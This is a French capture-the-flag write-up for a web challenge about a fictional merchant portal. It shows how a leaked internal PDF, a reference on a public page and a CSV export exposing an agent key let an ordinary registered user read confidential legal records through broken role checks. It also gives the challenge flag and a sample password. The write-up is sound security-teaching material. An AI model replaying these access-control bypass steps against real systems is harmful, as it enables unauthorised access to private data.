# algorithme123--marche-lome-carnet (web, 300) — RÉSOLU

## Challenge
Guichet Unique Commerçants (GUC). « récupère ce que le service contentieux ne destine pas au public. »

## Exploit — recon docs + contrôle d'accès cassé (BOLA/BFLA)
1. **`/docs/guide-agent.pdf`** (doc interne, texte en clair) révèle les API du module Carnet :
   - `GET /api/carnet/<ref>/extrait` (en-têtes `Accept: text/csv`, `X-Locale: fr-TG`) → colonne `cle_agent`.
   - `GET /api/service-juridique/<ref>` avec en-tête `X-Cle-Agent`.
   - Ancien compte `agent.guc / MarcheLome2024!` (désactivé).
2. **`/annonces`** (avis de suivi terrain) fuite la **réf carnet** : `e2f9b841-6c3a-4d7e-8f1b-9a0c5d4e3b27`.
3. **S'inscrire + se connecter** (`/register` puis `/login`, simple commerçant) → cookie `guc_session`.
4. `GET /api/carnet/<ref>/extrait` (authed) → CSV avec `ref_juridique=CTX-7f3a9c2e` et
   `cle_agent=554d0e692623d9f247d5004f` (colonnes « réservées service juridique — ne pas diffuser »).
5. `GET /api/service-juridique/CTX-7f3a9c2e` avec `X-Cle-Agent: 554d0e692623d9f247d5004f`
   → `note_confidentielle` = flag.

Faille : un commerçant lambda accède aux exports agent + dossiers juridiques (pas de cloisonnement de rôle).

## Flag
`NCTF{08bcb83e0a8fd1d54e8a6275}`
